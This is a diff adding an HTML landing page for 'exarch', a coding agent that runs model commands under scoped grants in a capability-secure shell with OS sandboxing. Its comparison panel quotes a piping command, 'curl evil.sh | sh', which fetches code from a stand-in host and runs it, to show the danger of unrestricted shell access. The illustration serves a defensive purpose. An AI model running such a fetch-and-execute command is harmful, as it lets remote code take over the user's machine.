@@ -1,0 +1,258 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>exarch — a sovereign model, a bounded province</title>
+  <meta name="description" content="exarch is a tiny coding agent that drives ral, a capability-secure shell. Every command the model emits runs under a scoped grant — typed, sandboxed, audited.">
+  <link rel="icon" href="favicon.svg" type="image/svg+xml">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;500;600&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="exarch.css">
+  <link rel="stylesheet" href="landing.css">
+  <script>
+    (function () {
+      var s = localStorage.getItem('ral-theme');
+      if (!s) s = matchMedia('(prefers-color-scheme: dark)').matches ? 'dark' : 'light';
+      if (s === 'dark') document.documentElement.classList.add('dark');
+    })();
+  </script>
+</head>
+<body>
+  {{MENUBAR}}
+
+  <main>
+
+    <!-- 1. crest -->
+    <div class="crest-wrap">
+      <div class="crest">
+        <span class="corner">viceroy of the grant</span>
+        <div class="ascii eagle scroll-x"><pre>     ▗▄▆███▆▄▖
+  ▗▟▀    ╋    ▀▙▖
+       ◢███◣
+ ◢█◣   █◠◠◠█   ◢█◣
+ ▐█▌█████╳█████▐█▌
+ ▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔</pre></div>
+        <div class="scroll-x"><div class="ascii banner"><pre> ███████╗██╗  ██╗ █████╗ ██████╗  ██████╗██╗  ██╗
+ ██╔════╝╚██╗██╔╝██╔══██╗██╔══██╗██╔════╝██║  ██║
+ █████╗   ╚███╔╝ ███████║██████╔╝██║     ███████║
+ ██╔══╝   ██╔██╗ ██╔══██║██╔══██╗██║     ██╔══██║
+ ███████╗██╔╝ ██╗██║  ██║██║  ██║╚██████╗██║  ██║
+ ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝</pre></div></div>
+        <p class="thesis">A <em>sovereign</em> model,<br>a <em>bounded</em> province.</p>
+        <div class="rule"></div>
+        <p class="sub">A coding agent that drives ral, a capability-secure shell. Every command the model emits runs under a scoped grant — typed, sandboxed, audited.</p>
+      </div>
+    </div>
+
+    <!-- 2. the decree -->
+    <section class="section decree">
+      <div class="column">
+        <p class="eyebrow">The exarch</p>
+        <p>In Byzantine usage, an <em>exarch</em> was a viceroy who acted on behalf of a distant sovereign within a bounded province. Here the sovereign is the LLM and the province is the <strong>grant</strong>.</p>
+        <p>exarch loops a chosen model against a single tool — <code>ral</code>. Each command the model emits is a top-level turn, evaluated under a profile's <code>Capabilities</code> pushed onto ral's capability stack. Typed commands, scoped authority, and an OS sandbox all fall out of one principle — without giving up first-class commands and pipes.</p>
+        <p>The exarch process itself is not sandboxed — it still needs HTTPS for the model API. But each tool call is: when caps restrict the filesystem or network, ral re-execs a child under Seatbelt on macOS or bwrap on Linux, evaluates the computation there, and returns.</p>
+      </div>
+    </section>
+
+    <!-- 3. the boundary -->
+    <section class="section boundary">
+      <div class="column">
+        <p class="eyebrow">The boundary</p>
+        <div class="compare">
+          <div class="panel">
+            <div class="panel-label">ambient authority</div>
+            <div class="body"><pre><span class="c"># one tool, no boundary</span>
+shell(<span class="s">"rm -rf node_modules"</span>)
+shell(<span class="s">"curl evil.sh | sh"</span>)
+<span class="c"># the model IS the machine</span></pre></div>
+          </div>
+          <div class="panel bound">
+            <div class="panel-label">within the province</div>
+            <div class="body"><pre><span class="c"># the model emits ral source;</span>
+<span class="c"># each turn runs under a grant</span>
+<span class="a">grant</span> [exec: [git:[], cargo:[]],
+       fs:   [read:  [<span class="s">'&lt;cwd&gt;'</span>],
+              write: [<span class="s">'&lt;cwd&gt;'</span>]],
+       net:  <span class="k">false</span>] {
+  cargo test -q
+}</pre></div>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- 4. writs of authority -->
+    <section class="section writs">
+      <div class="column">
+        <p class="eyebrow">Writs of authority</p>
+        <div class="lattice">
+          <div class="bound-mark"><span class="g">⊤</span> full ambient authority</div>
+
+          <div class="writ">
+            <span class="seal">✚</span>
+            <span class="name">dangerous</span>
+            <span class="desc">Lattice top. No attenuation.</span>
+            <span class="caps"><span><span class="key">net</span> inherit</span><span><span class="key">exec</span> inherit</span></span>
+          </div>
+          <div class="writ default">
+            <span class="seal">✚</span>
+            <span class="name">reasonable</span>
+            <span class="desc">Everyday agent. Broad reads, writes only ephemeral surfaces.</span>
+            <span class="caps"><span><span class="key">net</span> <span class="on">on</span></span><span><span class="key">exec</span> 80+ tools</span></span>
+          </div>
+          <div class="writ">
+            <span class="seal">✚</span>
+            <span class="name">read-only</span>
+            <span class="desc">Inspect without mutating. Writes scratch-only.</span>
+            <span class="caps"><span><span class="key">net</span> <span class="on">on</span></span><span><span class="key">write</span> scratch</span></span>
+          </div>
+          <div class="writ">
+            <span class="seal">✚</span>
+            <span class="name">minimal</span>
+            <span class="desc">System tools only. No homebrew, no xdg.</span>
+            <span class="caps"><span><span class="key">net</span> <span class="on">on</span></span><span><span class="key">exec</span> /bin + /usr/bin</span></span>
+          </div>
+          <div class="writ">
+            <span class="seal">✚</span>
+            <span class="name">confined</span>
+            <span class="desc">Build jail. Network off, cwd + scratch only.</span>
+            <span class="caps"><span><span class="key">net</span> <span class="off">off</span></span><span><span class="key">fs</span> cwd + scratch</span></span>
+          </div>
+
+          <div class="bound-mark"><span class="g">⊥</span> sealed jail</div>
+        </div>
+      </div>
+    </section>
+
+    <!-- 5. instruments -->
+    <section class="section instruments-sec">
+      <div class="column">
+        <p class="eyebrow">The instruments</p>
+        <div class="instruments">
+          <div class="inst">
+            <span class="glyph" aria-hidden="true">⊙</span>
+            <div>
+              <h3>Capability-scoped</h3>
+              <p>Every command runs under a profile's <code>grant</code>, pushed onto ral's capability stack. Authority is typed and checked before a process spawns — not a prompt-level promise.</p>
+            </div>
+          </div>
+          <div class="inst">
+            <span class="glyph" aria-hidden="true">▣</span>
+            <div>
+              <h3>OS-sandboxed</h3>
+              <p>When caps restrict the filesystem or network, ral re-execs a child under Seatbelt (macOS) or bwrap (Linux). The agent keeps HTTPS; the tool call does not.</p>
+            </div>
+          </div>
+          <div class="inst">
+            <span class="glyph" aria-hidden="true">⇄</span>
+            <div>
+              <h3>Multi-provider</h3>
+              <p>Anthropic, OpenAI, OpenRouter, DeepSeek, xAI, Qwen and more — auto-discovered from environment keys, then scrubbed at startup so no spawned child inherits them.</p>
+            </div>
+          </div>
+          <div class="inst">
+            <span class="glyph" aria-hidden="true">▤</span>
+            <div>
+              <h3>Audited</h3>
+              <p>A <code>session.log</code> under <code>$EXARCH_SCRATCH</code> captures the full transcript — unabridged stdout and stderr from every command.</p>
+            </div>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- 6. providers -->
+    <section class="section providers-sec">
+      <div class="column">
+        <p class="eyebrow">Providers</p>
+        <div class="providers">
+          <span class="chip">anthropic<span class="model">claude-opus-4</span></span>
+          <span class="chip">openai<span class="model">gpt-5.5</span></span>
+          <span class="chip">openrouter<span class="model">claude-opus-4</span></span>
+          <span class="chip">deepseek<span class="model">deepseek-chat</span></span>
+          <span class="chip">xai<span class="model">grok-4.3</span></span>
+          <span class="chip">qwen<span class="model">qwen3.6-plus</span></span>
+          <span class="chip more">+ custom / self-hosted</span>
+        </div>
+      </div>
+    </section>
+
+    <!-- 7. run -->
+    <section class="section run-sec">
+      <div class="column">
+        <p class="eyebrow">Run</p>
+        <div class="run">
+          <span class="prompt" aria-hidden="true">$</span>
+          <code class="cmd" id="run-cmd" role="button" tabindex="0"
+                aria-label="Copy run command to clipboard"><span class="env">ANTHROPIC_API_KEY</span>=<span class="dim">&#8230;</span> cargo run -p exarch</code>
+          <button class="copy" id="run-copy" type="button" aria-live="polite">copy</button>
+        </div>
+      </div>
+    </section>
+
+    <div class="seal-divider">✚</div>
+
+    <section class="section cta last">
+      <div class="column">
+        <p class="motto">One tool. One grant. The model commands; the <em>province bounds</em>.</p>
+        <div class="cta-links">
+          <a href="profiles.html">Read the profiles &rarr;</a>
+          <a href="https://github.com/lambdabetaeta/ral/tree/main/exarch">Source &rarr;</a>
+        </div>
+      </div>
+    </section>
+
+  </main>
+
+  <footer class="footer">
+    exarch &mdash; a tiny coding agent driving a capability-secure shell.
+    &middot; <a href="../index.html">ral</a> &middot; <a href="profiles.html">profiles</a>
+  </footer>
+
+  <script>
+    (function () {
+      /* ── copy run command ── */
+      var cmd  = document.getElementById('run-cmd');
+      var copy = document.getElementById('run-copy');
+      var text = 'ANTHROPIC_API_KEY=… cargo run -p exarch';
+      function flash() {
+        copy.textContent = 'copied';
+        copy.classList.add('done');
+        setTimeout(function () {
+          copy.textContent = 'copy';
+          copy.classList.remove('done');
+        }, 1600);
+      }
+      function doCopy() {
+        if (navigator.clipboard) {
+          navigator.clipboard.writeText(text).then(flash, flash);
+        } else { flash(); }
+      }
+      copy.addEventListener('click', doCopy);
+      cmd.addEventListener('click', doCopy);
+      cmd.addEventListener('keydown', function (e) {
+        if (e.key === 'Enter' || e.key === ' ') { e.preventDefault(); doCopy(); }
+      });
+
+      /* ── theme toggle ── */
+      var root  = document.documentElement;
+      var btn   = document.getElementById('theme-toggle');
+      var glyph = document.getElementById('theme-glyph');
+      var label = document.getElementById('theme-label');
+      function syncToggle() {
+        var dark = root.classList.contains('dark');
+        glyph.textContent = dark ? '☾' : '☀';
+        label.textContent = dark ? 'dark' : 'light';
+      }
+      syncToggle();
+      btn.addEventListener('click', function () {
+        root.classList.toggle('dark');
+        localStorage.setItem('ral-theme', root.classList.contains('dark') ? 'dark' : 'light');
+        syncToggle();
+      });
+    })();
+  </script>
+</body>
+</html>
